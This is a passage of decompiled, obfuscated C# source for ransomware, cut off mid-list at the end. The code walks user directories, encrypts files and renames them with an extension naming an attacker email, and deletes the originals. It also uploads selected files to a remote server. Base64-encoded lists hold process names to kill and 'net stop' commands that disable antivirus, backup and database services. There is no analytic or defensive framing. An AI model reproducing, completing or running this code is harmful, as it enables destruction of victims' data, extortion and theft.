using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using DanKKpviyewB;
using Microsoft.Win32;

namespace YXHSMjloYIX;

internal class zkwozuPRYYOVZ
{
	public class ojupeqwEhcrLE
	{
		private static StringCollection pEdMXcTpIbTV = new StringCollection();

		private static List<string> hoJwDLtNRXeO = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(bxMeQFfPcma("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("RESTORE_FILES_INFO") && !text.EndsWith(".secure[milleni5000@qq.com]") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(nlqqbwYoua))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(yPSUEgRwnzet) * 1024.0 * 1024.0 && JIFIJUtqqle == "YES")
							{
								hoJwDLtNRXeO.Add(text);
							}
							else if (File.Exists(text) && JIFIJUtqqle == "NO")
							{
								hoJwDLtNRXeO.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				string[] array4 = array2;
				foreach (string root2 in array4)
				{
					WalkDirectoryTree(root2);
				}
			}
			return hoJwDLtNRXeO;
		}
	}

	[CompilerGenerated]
	private sealed class lHXNxrDHNzF
	{
		public string yCLDmttZzfTFy;

		public bool _003CMain_003Eb__4(Process p)
		{
			return p.ProcessName == yCLDmttZzfTFy;
		}
	}

	[CompilerGenerated]
	private sealed class yiukIvyeUcCeC
	{
		private sealed class XosxGsGyAuMSc
		{
			public yiukIvyeUcCeC aTCHawTfQgiXxjnL;

			public string ySahBiamegKY;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					bLBdyNLBnFDdJu(WindowsIdentity.GetCurrent().Name, ySahBiamegKY);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				VtEtSIQGnyoaU(ySahBiamegKY, aTCHawTfQgiXxjnL.wOHQTpBnJlq, aTCHawTfQgiXxjnL.ItIDTJkALC, aTCHawTfQgiXxjnL.OcDjfnqyBlg, aTCHawTfQgiXxjnL.huBDjwdVoPecFT);
			}
		}

		public string[] wOHQTpBnJlq;

		public string[] OcDjfnqyBlg;

		public string huBDjwdVoPecFT;

		public string ItIDTJkALC;

		public void _003CCrypt_003Eb__1d(string t)
		{
			if (DLfPrQdkdIeFtqyQh && !WcJqCsWMqEx().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						bLBdyNLBnFDdJu(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (HNEisHCJMOwx == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					VtEtSIQGnyoaU(t, wOHQTpBnJlq, ItIDTJkALC, OcDjfnqyBlg, huBDjwdVoPecFT);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				VtEtSIQGnyoaU(t, wOHQTpBnJlq, ItIDTJkALC, OcDjfnqyBlg, huBDjwdVoPecFT);
			}
		}
	}

	[CompilerGenerated]
	private sealed class hjYtpKEExarHlT
	{
		private sealed class vmxJfqUByMIk
		{
			public hjYtpKEExarHlT zStMOzMmulF;

			public string eSKyHypYUiyygGvE;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in hDIFdHdmiGRW)
				{
					if (eSKyHypYUiyygGvE.ToLower().EndsWith(item + zStMOzMmulF.HDkeVNpbMBRHo) && aQljRLcneiL == "YES")
					{
						if (Convert.ToInt32(DKFiWstOyiqUH) * 1024 * 1024 > new FileInfo(eSKyHypYUiyygGvE).Length)
						{
							try
							{
								QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", eSKyHypYUiyygGvE);
							}
							catch
							{
							}
						}
					}
					else if (eSKyHypYUiyygGvE.ToLower().EndsWith(item) && aQljRLcneiL == "NO")
					{
						try
						{
							QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", eSKyHypYUiyygGvE);
						}
						catch
						{
						}
					}
				}
			}
		}

		private sealed class KtufmekYHHBZn
		{
			public hjYtpKEExarHlT zStMOzMmulF;

			public string cpNFufHkqEFWZ;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in hDIFdHdmiGRW)
				{
					if (cpNFufHkqEFWZ.ToLower().EndsWith(item + zStMOzMmulF.HDkeVNpbMBRHo) && aQljRLcneiL == "YES")
					{
						if (Convert.ToInt32(DKFiWstOyiqUH) * 1024 * 1024 > new FileInfo(cpNFufHkqEFWZ).Length)
						{
							try
							{
								QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", cpNFufHkqEFWZ);
							}
							catch
							{
							}
						}
					}
					else if (cpNFufHkqEFWZ.ToLower().EndsWith(item) && aQljRLcneiL == "NO")
					{
						try
						{
							QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", cpNFufHkqEFWZ);
						}
						catch
						{
						}
					}
				}
			}
		}

		public List<string> ZmazVdvZdatVgRw;

		public List<string> JHQLtvgXwOmlO;

		public string HDkeVNpbMBRHo;

		public string[] VfPuBBXLNep;

		public string DehSnBFxBRTQ;

		public void _003CWorkerCrypter2_003Eb__2a(string t1)
		{
			string eSKyHypYUiyygGvE;
			foreach (string item in JHQLtvgXwOmlO)
			{
				if (VfPuBBXLNep.Length != 0)
				{
					string[] vfPuBBXLNep = VfPuBBXLNep;
					int num = 0;
					while (num < vfPuBBXLNep.Length)
					{
						string value = vfPuBBXLNep[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_05e6;
					}
				}
				try
				{
					if (item.EndsWith(HDkeVNpbMBRHo))
					{
						goto IL_05e6;
					}
				}
				catch (Exception)
				{
					goto IL_05e6;
				}
				if (!item.EndsWith(t1) || XYGILCGcqmQH.Contains(item))
				{
					continue;
				}
				if (TrXhqrcUQGBU == "YES")
				{
					try
					{
						if (vIiOdwpLyxjpGf.iDVHILqBuXK(item))
						{
							vIiOdwpLyxjpGf.QPpsHyEiCqZW(item);
						}
					}
					catch
					{
					}
				}
				XYGILCGcqmQH.Add(item);
				if (!djMglWkrThaf.Contains(Path.GetDirectoryName(item)))
				{
					djMglWkrThaf.Add(Path.GetDirectoryName(item));
				}
				RwskFQyGOARyn(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (zHjohLaJRunF)
						{
							try
							{
								File.AppendAllText(AycWHRRkQAZMoSL, "File: " + item + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_00e5;
					}
					if (QYebiuGveQzf == "YES" && new FileInfo(item).Length > Convert.ToInt32(RZwhptcFPa) * 1024 * 1024 && !ZmazVdvZdatVgRw.Contains(t1))
					{
						try
						{
							if (HDkeVNpbMBRHo != ".*")
							{
								File.Move(item, item + HDkeVNpbMBRHo);
							}
						}
						catch (Exception ex4)
						{
							if (zHjohLaJRunF)
							{
								try
								{
									File.AppendAllText(AycWHRRkQAZMoSL, "File: " + item + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						eSKyHypYUiyygGvE = "";
						if (HDkeVNpbMBRHo != ".*")
						{
							eSKyHypYUiyygGvE = item + HDkeVNpbMBRHo;
						}
						else
						{
							eSKyHypYUiyygGvE = item;
						}
						if (vyQhuqfsME == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in hDIFdHdmiGRW)
								{
									if (eSKyHypYUiyygGvE.ToLower().EndsWith(item2 + HDkeVNpbMBRHo) && aQljRLcneiL == "YES")
									{
										if (Convert.ToInt32(DKFiWstOyiqUH) * 1024 * 1024 > new FileInfo(eSKyHypYUiyygGvE).Length)
										{
											try
											{
												QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", eSKyHypYUiyygGvE);
											}
											catch
											{
											}
										}
									}
									else if (eSKyHypYUiyygGvE.ToLower().EndsWith(item2) && aQljRLcneiL == "NO")
									{
										try
										{
											QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", eSKyHypYUiyygGvE);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = gQuYjEmPxqYv.VAHTkDGshMkF(32);
						string s = jEsaJdxjWqPyGCH.stchvRxTqLlLx(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] array2 = UMuLPfDIPbk.fVqAzfnOgclWqh(eSKyHypYUiyygGvE, Convert.ToInt32(RZwhptcFPa) * 1024 * 1024);
						UMuLPfDIPbk.mSMdqwRUXGu(NciqQhSWbfClU: (!zYwzjEDkZQtaV) ? (TiYWIzCfNH ? UMuLPfDIPbk.cbzUtQrNiJp(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UMuLPfDIPbk.cbzUtQrNiJp(array2, Encoding.ASCII.GetBytes(DehSnBFxBRTQ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TiYWIzCfNH ? CYEAiHugFcXLfMP.yrhlrOiGLQmYz(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : CYEAiHugFcXLfMP.yrhlrOiGLQmYz(array2, Encoding.ASCII.GetBytes(DehSnBFxBRTQ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), MmblxfahxxCq: eSKyHypYUiyygGvE, DrFOiocWmftuTC: bytes);
					}
					else
					{
						string text2 = gQuYjEmPxqYv.VAHTkDGshMkF(32);
						string s2 = jEsaJdxjWqPyGCH.stchvRxTqLlLx(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (HDkeVNpbMBRHo != ".*")
						{
							if (!HvyOqSUDzaouQicF)
							{
								if (!TiYWIzCfNH)
								{
									cPxOexmGvTaNs(item, item + HDkeVNpbMBRHo, hUqYxvezKdhZvA);
								}
								else
								{
									cPxOexmGvTaNs(item, item + HDkeVNpbMBRHo, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!TiYWIzCfNH)
									{
										nDXMFwKsrVToPZ(item, item + HDkeVNpbMBRHo, hUqYxvezKdhZvA);
									}
									else
									{
										nDXMFwKsrVToPZ(item, item + HDkeVNpbMBRHo, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (zHjohLaJRunF)
									{
										try
										{
											File.AppendAllText(AycWHRRkQAZMoSL, "File: " + item + " - Error while fully writing to file: " + ex6.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!HvyOqSUDzaouQicF)
						{
							if (!TiYWIzCfNH)
							{
								cPxOexmGvTaNs(item, item + ".part", hUqYxvezKdhZvA);
							}
							else
							{
								cPxOexmGvTaNs(item, item + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!TiYWIzCfNH)
								{
									nDXMFwKsrVToPZ(item, item, hUqYxvezKdhZvA);
								}
								else
								{
									nDXMFwKsrVToPZ(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (zHjohLaJRunF)
								{
									try
									{
										File.AppendAllText(AycWHRRkQAZMoSL, "File: " + item + " - Error while fully writing to file: " + ex8.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (TiYWIzCfNH)
						{
							if (HDkeVNpbMBRHo != ".*")
							{
								QvrqrwsywdSEqe(item + HDkeVNpbMBRHo, bytes2);
							}
							else
							{
								QvrqrwsywdSEqe(item, bytes2);
							}
						}
					}
					goto IL_05e6;
					end_IL_00e5:;
				}
				catch (Exception)
				{
					goto IL_05e6;
				}
				continue;
				IL_05e6:
				JHQLtvgXwOmlO.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string fileInfo)
		{
			if (VfPuBBXLNep.Length != 0)
			{
				string[] vfPuBBXLNep = VfPuBBXLNep;
				int num = 0;
				while (num < vfPuBBXLNep.Length)
				{
					string value = vfPuBBXLNep[num];
					if (!fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0676;
				}
			}
			try
			{
				if (fileInfo.EndsWith(HDkeVNpbMBRHo))
				{
					goto IL_0676;
				}
			}
			catch (Exception)
			{
				goto IL_0676;
			}
			if (!XYGILCGcqmQH.Contains(fileInfo))
			{
				if (TrXhqrcUQGBU == "YES")
				{
					try
					{
						if (vIiOdwpLyxjpGf.iDVHILqBuXK(fileInfo))
						{
							vIiOdwpLyxjpGf.QPpsHyEiCqZW(fileInfo);
						}
					}
					catch
					{
					}
				}
				XYGILCGcqmQH.Add(fileInfo);
				if (!djMglWkrThaf.Contains(Path.GetDirectoryName(fileInfo)))
				{
					djMglWkrThaf.Add(Path.GetDirectoryName(fileInfo));
				}
				RwskFQyGOARyn(fileInfo);
				try
				{
					try
					{
						if (new FileInfo(fileInfo).Length != 0L)
						{
							goto end_IL_010d;
						}
						goto end_IL_010d_2;
						end_IL_010d:;
					}
					catch (Exception ex2)
					{
						if (zHjohLaJRunF)
						{
							try
							{
								File.AppendAllText(AycWHRRkQAZMoSL, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_010d_2;
					}
					if (QYebiuGveQzf == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(RZwhptcFPa) * 1024 * 1024)
					{
						try
						{
							if (HDkeVNpbMBRHo != ".*")
							{
								File.Move(fileInfo, fileInfo + HDkeVNpbMBRHo);
							}
						}
						catch (Exception ex4)
						{
							if (zHjohLaJRunF)
							{
								try
								{
									File.AppendAllText(AycWHRRkQAZMoSL, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (HDkeVNpbMBRHo != ".*")
						{
							fileInfo += HDkeVNpbMBRHo;
						}
						if (vyQhuqfsME == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in hDIFdHdmiGRW)
								{
									if (fileInfo.ToLower().EndsWith(item + HDkeVNpbMBRHo) && aQljRLcneiL == "YES")
									{
										if (Convert.ToInt32(DKFiWstOyiqUH) * 1024 * 1024 > new FileInfo(fileInfo).Length)
										{
											try
											{
												QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (fileInfo.ToLower().EndsWith(item) && aQljRLcneiL == "NO")
									{
										try
										{
											QtudfCYcVUfF.FFwygAkuXreOyx("URL", "USERNAME", "ACCESO", fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = gQuYjEmPxqYv.VAHTkDGshMkF(32);
						string s = jEsaJdxjWqPyGCH.stchvRxTqLlLx(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] array2 = UMuLPfDIPbk.fVqAzfnOgclWqh(fileInfo, Convert.ToInt32(RZwhptcFPa) * 1024 * 1024);
						UMuLPfDIPbk.mSMdqwRUXGu(NciqQhSWbfClU: (!zYwzjEDkZQtaV) ? (TiYWIzCfNH ? UMuLPfDIPbk.cbzUtQrNiJp(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UMuLPfDIPbk.cbzUtQrNiJp(array2, Encoding.ASCII.GetBytes(DehSnBFxBRTQ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TiYWIzCfNH ? CYEAiHugFcXLfMP.yrhlrOiGLQmYz(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : CYEAiHugFcXLfMP.yrhlrOiGLQmYz(array2, Encoding.ASCII.GetBytes(DehSnBFxBRTQ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), MmblxfahxxCq: fileInfo, DrFOiocWmftuTC: bytes);
					}
					else
					{
						string text2 = gQuYjEmPxqYv.VAHTkDGshMkF(32);
						string s2 = jEsaJdxjWqPyGCH.stchvRxTqLlLx(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (HDkeVNpbMBRHo != ".*")
						{
							if (!HvyOqSUDzaouQicF)
							{
								if (!TiYWIzCfNH)
								{
									cPxOexmGvTaNs(fileInfo, fileInfo + HDkeVNpbMBRHo, hUqYxvezKdhZvA);
								}
								else
								{
									cPxOexmGvTaNs(fileInfo, fileInfo + HDkeVNpbMBRHo, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!TiYWIzCfNH)
									{
										nDXMFwKsrVToPZ(fileInfo, fileInfo + HDkeVNpbMBRHo, hUqYxvezKdhZvA);
									}
									else
									{
										nDXMFwKsrVToPZ(fileInfo, fileInfo + HDkeVNpbMBRHo, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (zHjohLaJRunF)
									{
										try
										{
											File.AppendAllText(AycWHRRkQAZMoSL, "File: " + fileInfo + " - Error while fully writing to file: " + ex6.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!HvyOqSUDzaouQicF)
						{
							if (!TiYWIzCfNH)
							{
								cPxOexmGvTaNs(fileInfo, fileInfo + ".part", hUqYxvezKdhZvA);
							}
							else
							{
								cPxOexmGvTaNs(fileInfo, fileInfo + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!TiYWIzCfNH)
								{
									nDXMFwKsrVToPZ(fileInfo, fileInfo, hUqYxvezKdhZvA);
								}
								else
								{
									nDXMFwKsrVToPZ(fileInfo, fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (zHjohLaJRunF)
								{
									try
									{
										File.AppendAllText(AycWHRRkQAZMoSL, "File: " + fileInfo + " - Error while fully writing to file: " + ex8.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (TiYWIzCfNH)
						{
							if (HDkeVNpbMBRHo != ".*")
							{
								QvrqrwsywdSEqe(fileInfo + HDkeVNpbMBRHo, bytes2);
							}
							else
							{
								QvrqrwsywdSEqe(fileInfo, bytes2);
							}
						}
					}
					end_IL_010d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0676;
			IL_0676:
			JHQLtvgXwOmlO.Remove(fileInfo);
		}
	}

	[CompilerGenerated]
	private sealed class YjtpYmHeoWvAawzf
	{
		public string PvkRgOHDBNpcyCB;

		public string mHzYjQtrdnmP;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(PvkRgOHDBNpcyCB);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(mHzYjQtrdnmP))
					{
						File.Delete(mHzYjQtrdnmP);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string JLJqrszYkAFF = "EVET";

	public static string[] VSaHDiIcsWtWsbC;

	public static IEnumerable<DirectoryInfo> ZiLFxWfkiwger;

	public static byte[] hUqYxvezKdhZvA = null;

	public static DirectoryInfo WJkskyapSry;

	public static string JIFIJUtqqle = "NO";

	public static string yPSUEgRwnzet = "100000000";

	public static List<string> SrDtznAsnWUwPJK = new List<string>();

	public static List<string> LQIxIhixGymhg = new List<string>();

	public static string eLLqmCUgIdcu = "NO";

	public static string DehSnBFxBRTQ = "";

	public static string IwPSXHhpiDtLFcof = "";

	public static string ILyYMkoAAkCGpa = "NO";

	public static int ILiEmktwdJomSrE = 0;

	public static string TrXhqrcUQGBU = "NO";

	public static string nRTGnZDeYR = "NO";

	public static string tyEFYIpWFnddHYM = "NO";

	public static string eCwoExENSsx = "0";

	public static string qPgQRUiwfzgrWssm = "NO";

	public static string ydydMYUgqf = "NO";

	public static string WtKRHGUzoAXqFqa = "NO";

	public static string dJDkbcwmGXJX = "NO";

	public static List<string> osvcMgbIZbyU = new List<string>
	{
		bxMeQFfPcma("bHNhc3MuZXhl"),
		bxMeQFfPcma("c3ZjaHN0LmV4ZQ=="),
		bxMeQFfPcma("Y3Jjc3MuZXhl"),
		bxMeQFfPcma("Y2hyb21lMzIuZXhl"),
		bxMeQFfPcma("ZmlyZWZveC5leGU="),
		bxMeQFfPcma("Y2FsYy5leGU="),
		bxMeQFfPcma("bXlzcWxkLmV4ZQ=="),
		bxMeQFfPcma("ZGxsaHN0LmV4ZQ=="),
		bxMeQFfPcma("b3BlcmEzMi5leGU="),
		bxMeQFfPcma("bWVtb3AuZXhl"),
		bxMeQFfPcma("c3Bvb2xjdi5leGU="),
		bxMeQFfPcma("Y3RmbW9tLmV4ZQ=="),
		bxMeQFfPcma("U2t5cGVBcHAuZXhl")
	};

	public static List<string> djMglWkrThaf = new List<string>();

	public static string BvuqeEdKdrAdmV = "NO";

	public static string PHjxHxoKCeaa = "NO";

	public static string jrgdZgeNoZYfKaXD = "NO";

	public static List<string> XYGILCGcqmQH = new List<string>();

	public static string sxGUuCyBWsL = "NO";

	private static string GZdyaPHHjBASItH = "cfdf5dc8-fd37-494c-9550-11e808020d3c";

	public static string HNEisHCJMOwx = "NO";

	public static string ragEYxUaXIGnx = "NO";

	public static List<string> iHFkCACrEkmF = new List<string>
	{
		bxMeQFfPcma("c3RhcnQgRG5zY2FjaGUgL3k="),
		bxMeQFfPcma("c3RhcnQgRkRSZXNQdWIgL3k="),
		bxMeQFfPcma("c3RhcnQgU1NEUFNSViAveQ=="),
		bxMeQFfPcma("c3RhcnQgdXBucGhvc3QgL3k="),
		bxMeQFfPcma("c3RvcCBhdnBzdXMgL3k="),
		bxMeQFfPcma("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		bxMeQFfPcma("c3RvcCBtZmV3YyAveQ=="),
		bxMeQFfPcma("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		bxMeQFfPcma("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		bxMeQFfPcma("c3RvcCBEZWZXYXRjaCAveQ=="),
		bxMeQFfPcma("c3RvcCBjY0V2dE1nciAveQ=="),
		bxMeQFfPcma("c3RvcCBjY1NldE1nciAveQ=="),
		bxMeQFfPcma("c3RvcCBTYXZSb2FtIC95"),
		bxMeQFfPcma("c3RvcCBSVFZzY2FuIC95"),
		bxMeQFfPcma("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		bxMeQFfPcma("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		bxMeQFfPcma("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		bxMeQFfPcma("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		bxMeQFfPcma("c3RvcCBZb29CYWNrdXAgL3k="),
		bxMeQFfPcma("c3RvcCBZb29JVCAveQ=="),
		bxMeQFfPcma("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		bxMeQFfPcma("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		bxMeQFfPcma("c3RvcCBWU05BUFZTUyAveQ=="),
		bxMeQFfPcma("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		bxMeQFfPcma("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		bxMeQFfPcma("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		bxMeQFfPcma("c3RvcCB2ZWVhbSAveQ=="),
		bxMeQFfPcma("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		bxMeQFfPcma("c3RvcCBBY3JTY2gyU3ZjIC95"),
		bxMeQFfPcma("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		bxMeQFfPcma("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		bxMeQFfPcma("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		bxMeQFfPcma("c3RvcCBzb3Bob3MgL3k="),
		bxMeQFfPcma("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		bxMeQFfPcma("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		bxMeQFfPcma("c3RvcCBJSVNBZG1pbiAveQ=="),
		bxMeQFfPcma("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		bxMeQFfPcma("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		bxMeQFfPcma("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		bxMeQFfPcma("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		bxMeQFfPcma("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		bxMeQFfPcma("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		bxMeQFfPcma("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		bxMeQFfPcma("c3RvcCBTYW1TcyAveQ=="),
		bxMeQFfPcma("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		bxMeQFfPcma("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		bxMeQFfPcma("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		bxMeQFfPcma("c3RvcCBQT1AzU3ZjIC95"),
		bxMeQFfPcma("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		bxMeQFfPcma("c3RvcCBTTVRQU3ZjIC95"),
		bxMeQFfPcma("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		bxMeQFfPcma("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		bxMeQFfPcma("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		bxMeQFfPcma("c3RvcCBTc3RwU3ZjIC95"),
		bxMeQFfPcma("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		bxMeQFfPcma("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
